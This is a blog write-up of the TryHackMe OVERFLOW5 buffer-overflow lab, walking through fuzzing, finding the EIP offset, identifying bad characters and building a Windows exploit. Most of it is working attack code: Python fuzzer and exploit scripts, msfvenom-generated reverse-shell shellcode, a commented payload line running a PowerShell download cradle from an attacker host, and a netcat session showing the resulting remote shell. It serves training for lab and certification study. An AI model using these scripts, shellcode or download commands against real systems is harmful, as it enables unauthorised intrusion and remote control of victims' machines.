---
layout: post
title: OVERFLOW5 - TryHackMe
tags: [THM, BoF, Windows]
description: "OVERFLOW5 - TryHackMe"
---


# Vulnerable System: 192.168.0.104
Link: [https://tryhackme.com/room/bufferoverflowprep](https://tryhackme.com/room/bufferoverflowprep)

- [Fuzzing](#fuzzing)
- [Finding the stack offset](#findinf-the-stack-offset)
- [Overwrite EIP](#overwrite-eip)
- [Find bad characters](#find-bad-characters)
- [Find the right module](#find-the-right-module)
- [Generate shellcode](#generate-shellcode)
-  [Win a shell](#win-a-shell)

![logo](/assets/imgs/bof5_oscp/logo.png)

------

## Fuzzing

Proof of concept that the service running on port 1337 is vulnerable to a BufferOverflow

```
> rlwrap nc 192.168.0.104 1337
Welcome to OSCP Vulnerable Server! Enter HELP for help.
HELP
Valid Commands:
HELP
OVERFLOW1 [value]
OVERFLOW2 [value]
OVERFLOW3 [value]
OVERFLOW4 [value]
OVERFLOW5 [value]
OVERFLOW6 [value]
OVERFLOW7 [value]
OVERFLOW8 [value]
OVERFLOW9 [value]
OVERFLOW10 [value]
EXIT

OVERFLOW5 AAAA
OVERFLOW5 COMPLETE
```

I create a small python2 script to iterate the values ​​of the argument that I am passing to the vulnerable service until I reach a point where the service stops working.

```
#!/usr/bin/python2
import socket
import sys
from time import sleep

buffer = "A" * 200

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(('192.168.0.104',1337))
        s.recv(1024)

        print '[*] Length: ' + str(len(buffer))
        s.send("OVERFLOW5 " + buffer)
        s.close()
        sleep(1)
        buffer=buffer+'A'* 200

    except Exception as e:
        print '[*] Error: ' + str(e)
        sys.exit()
```

I launch the fuzzer.py and it is observed that the service crashes after sending 400 A's

```
> python fuzzer.py
[*] Length: 200
[*] Length: 400
[*] Error: timed out
```
![crash](/assets/imgs/bof5_oscp/crash.png)

------

## Finding the stack offset
To locate the memory address where the EIP is, I create a character pattern with the metasploit utility **pattern_create** with a length of 400.

```
> sudo /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 400
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

I make the specific modifications to the script.

```
import socket
import sys
from time import sleep

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.0.104',1337))
  s.recv(1024)

  print '[*] Sending buffer'
  s.send("OVERFLOW5 " + buffer)
  s.close()

except Exception as e:
  print '[!]' + str(e)
  sys.exit()
```
Launching the script.

```
> python eip.py
[*] Sending buffer
```

![eip](/assets/imgs/bof5_oscp/eip.png)

Using **pattern_create** to get the exact address of the EIP registry.

```
> sudo /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -q 356B4134
[*] Exact match at offset 314
```

## Overwrite EIP

I modify the script to verify that the EIP address has been found correctly.

```
import socket
import sys
from time import sleep

buffer = "A"*314 + "B"*4 + "C"*500

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.0.104',1337))
  s.recv(1024)

  print '[*] Sending buffer'
  s.send("OVERFLOW5 " + buffer)
  s.close()

except Exception as e:
  print '[!]' + str(e)
  sys.exit()
```

I run the script.

```
> python eip.py
[*] Sending buffer
```

![eip2](/assets/imgs/bof5_oscp/eip2.png)

## Find bad characters

Print all characters in python format for testing

> pip install badchars

```
> badchars -f python
badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```

script badchars.py

```
import socket, sys
from time import sleep

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = 'A' * 314 + "B"*4 + badchars + "C"*500

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(('192.168.0.104',1337))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send("OVERFLOW5 " + buffer)
  s.close()

except Exception as e:
  print '[*] Error: ' + str(e)
  sys.exit()

```

I set up a working folder from the ImmunityDebugger console

> We must have added the mona.py script in the ImmunityDebugger folder

![workingfolder.png](/assets/imgs/bof5_oscp/workingfolder.png)

Creation of a bytearray through mona

![bytearray_mona](/assets/imgs/bof5_oscp/bytearray_mona.png)

We make the comparisons indicating the direction of the ESP

![mona_compare](/assets/imgs/bof5_oscp/mona_compare.png)

The comparisons will be made until we can find all the characters that can obstruct our shellcode that we will generate.

![badchars](/assets/imgs/bof5_oscp/badchars.png)

## Find the right module
Searching the executable modules with the option that all have the property of **false**.

![mona_modules](/assets/imgs/bof5_oscp/mona_modules.png)

We choose an address that has a jump to the **ESP** register.

![dllfunc](/assets/imgs/bof5_oscp/dllfunc.png)

If we observe the second option of the modules, we observe that there is no address that has a jump to ESP.

Therefore we will stay with the first.

![oscp](/assets/imgs/bof5_oscp/oscp.png)


## Generate shellcode

```
> msfvenom -p windows/shell_reverse_tcp lhost=192.168.0.106 lport=4444 -b "\x00\x16\x2f\xf4\xfd\xfe" EXITFUNC=thread -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with Failed to locate a valid permutation.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor failed with Encoding failed due to a bad character (index=23, char=0xf4)
Attempting to encode payload with 1 iterations of x86/countdown
x86/countdown failed with Encoding failed due to a bad character (index=43, char=0x16)
Attempting to encode payload with 1 iterations of x86/fnstenv_mov
x86/fnstenv_mov failed with Encoding failed due to a bad character (index=8, char=0xf4)
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 353 (iteration=0)
x86/jmp_call_additive chosen with final size 353
Payload size: 353 bytes
Final size of c file: 1508 bytes
unsigned char buf[] =
"\xfc\xbb\x97\x19\xc4\xcb\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x6b\xf1\x46\xcb\x93"
"\x02\x27\x45\x76\x33\x67\x31\xf3\x64\x57\x31\x51\x89\x1c\x17"
"\x41\x1a\x50\xb0\x66\xab\xdf\xe6\x49\x2c\x73\xda\xc8\xae\x8e"
"\x0f\x2a\x8e\x40\x42\x2b\xd7\xbd\xaf\x79\x80\xca\x02\x6d\xa5"
"\x87\x9e\x06\xf5\x06\xa7\xfb\x4e\x28\x86\xaa\xc5\x73\x08\x4d"
"\x09\x08\x01\x55\x4e\x35\xdb\xee\xa4\xc1\xda\x26\xf5\x2a\x70"
"\x07\x39\xd9\x88\x40\xfe\x02\xff\xb8\xfc\xbf\xf8\x7f\x7e\x64"
"\x8c\x9b\xd8\xef\x36\x47\xd8\x3c\xa0\x0c\xd6\x89\xa6\x4a\xfb"
"\x0c\x6a\xe1\x07\x84\x8d\x25\x8e\xde\xa9\xe1\xca\x85\xd0\xb0"
"\xb6\x68\xec\xa2\x18\xd4\x48\xa9\xb5\x01\xe1\xf0\xd1\xe6\xc8"
"\x0a\x22\x61\x5a\x79\x10\x2e\xf0\x15\x18\xa7\xde\xe2\x5f\x92"
"\xa7\x7c\x9e\x1d\xd8\x55\x65\x49\x88\xcd\x4c\xf2\x43\x0d\x70"
"\x27\xc3\x5d\xde\x98\xa4\x0d\x9e\x48\x4d\x47\x11\xb6\x6d\x68"
"\xfb\xdf\x04\x93\x6c\x20\x70\x9b\x06\xc8\x83\x9b\xc7\x54\x0d"
"\x7d\x8d\x74\x5b\xd6\x3a\xec\xc6\xac\xdb\xf1\xdc\xc9\xdc\x7a"
"\xd3\x2e\x92\x8a\x9e\x3c\x43\x7b\xd5\x1e\xc2\x84\xc3\x36\x88"
"\x17\x88\xc6\xc7\x0b\x07\x91\x80\xfa\x5e\x77\x3d\xa4\xc8\x65"
"\xbc\x30\x32\x2d\x1b\x81\xbd\xac\xee\xbd\x99\xbe\x36\x3d\xa6"
"\xea\xe6\x68\x70\x44\x41\xc3\x32\x3e\x1b\xb8\x9c\xd6\xda\xf2"
"\x1e\xa0\xe2\xde\xe8\x4c\x52\xb7\xac\x73\x5b\x5f\x39\x0c\x81"
"\xff\xc6\xc7\x01\x1f\x25\xcd\x7f\x88\xf0\x84\x3d\xd5\x02\x73"
"\x01\xe0\x80\x71\xfa\x17\x98\xf0\xff\x5c\x1e\xe9\x8d\xcd\xcb"
"\x0d\x21\xed\xd9\x0d\xc5\x11\xe2";
```


## Win a shell

Script exploit.py

```
import socket
import sys
from time import sleep

# msfvenom -p windows/shell_reverse_tcp lhost=192.168.0.105 lport=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00\x07\x2e\xa0\x00\x07\x2e\xa0" -f c
# msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.0.105:8000/PS.ps1')" lhost=192.168.0.105 lport=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00\x07\x2e\xa0" -f c

shellcode=("\xfc\xbb\x97\x19\xc4\xcb\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x6b\xf1\x46\xcb\x93"
"\x02\x27\x45\x76\x33\x67\x31\xf3\x64\x57\x31\x51\x89\x1c\x17"
"\x41\x1a\x50\xb0\x66\xab\xdf\xe6\x49\x2c\x73\xda\xc8\xae\x8e"
"\x0f\x2a\x8e\x40\x42\x2b\xd7\xbd\xaf\x79\x80\xca\x02\x6d\xa5"
"\x87\x9e\x06\xf5\x06\xa7\xfb\x4e\x28\x86\xaa\xc5\x73\x08\x4d"
"\x09\x08\x01\x55\x4e\x35\xdb\xee\xa4\xc1\xda\x26\xf5\x2a\x70"
"\x07\x39\xd9\x88\x40\xfe\x02\xff\xb8\xfc\xbf\xf8\x7f\x7e\x64"
"\x8c\x9b\xd8\xef\x36\x47\xd8\x3c\xa0\x0c\xd6\x89\xa6\x4a\xfb"
"\x0c\x6a\xe1\x07\x84\x8d\x25\x8e\xde\xa9\xe1\xca\x85\xd0\xb0"
"\xb6\x68\xec\xa2\x18\xd4\x48\xa9\xb5\x01\xe1\xf0\xd1\xe6\xc8"
"\x0a\x22\x61\x5a\x79\x10\x2e\xf0\x15\x18\xa7\xde\xe2\x5f\x92"
"\xa7\x7c\x9e\x1d\xd8\x55\x65\x49\x88\xcd\x4c\xf2\x43\x0d\x70"
"\x27\xc3\x5d\xde\x98\xa4\x0d\x9e\x48\x4d\x47\x11\xb6\x6d\x68"
"\xfb\xdf\x04\x93\x6c\x20\x70\x9b\x06\xc8\x83\x9b\xc7\x54\x0d"
"\x7d\x8d\x74\x5b\xd6\x3a\xec\xc6\xac\xdb\xf1\xdc\xc9\xdc\x7a"
"\xd3\x2e\x92\x8a\x9e\x3c\x43\x7b\xd5\x1e\xc2\x84\xc3\x36\x88"
"\x17\x88\xc6\xc7\x0b\x07\x91\x80\xfa\x5e\x77\x3d\xa4\xc8\x65"
"\xbc\x30\x32\x2d\x1b\x81\xbd\xac\xee\xbd\x99\xbe\x36\x3d\xa6"
"\xea\xe6\x68\x70\x44\x41\xc3\x32\x3e\x1b\xb8\x9c\xd6\xda\xf2"
"\x1e\xa0\xe2\xde\xe8\x4c\x52\xb7\xac\x73\x5b\x5f\x39\x0c\x81"
"\xff\xc6\xc7\x01\x1f\x25\xcd\x7f\x88\xf0\x84\x3d\xd5\x02\x73"
"\x01\xe0\x80\x71\xfa\x17\x98\xf0\xff\x5c\x1e\xe9\x8d\xcd\xcb"
"\x0d\x21\xed\xd9\x0d\xc5\x11\xe2")

buffer = 'A'*300 + "\x90"*14 + '\x05\x12\x50\x62' + "\x90"*20 + shellcode

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.0.104',1337))
  s.recv(1024)

  print '[*] Sending buffer'
  s.send("OVERFLOW5 " + buffer)
  s.close()

except Exception as e:
  print '[*] Error: ' + str(e)
  sys.exit()
```

```
> python exploit.py
[*] Sending buffer

____________________________________________________________________________

> nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.0.106] from (UNKNOWN) [192.168.0.104] 49190
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\win7bits\Desktop\vulnerable-apps\oscp>whoami
whoami
win7\win7bits

C:\Users\win7bits\Desktop\vulnerable-apps\oscp>hostname
hostname
win7

```
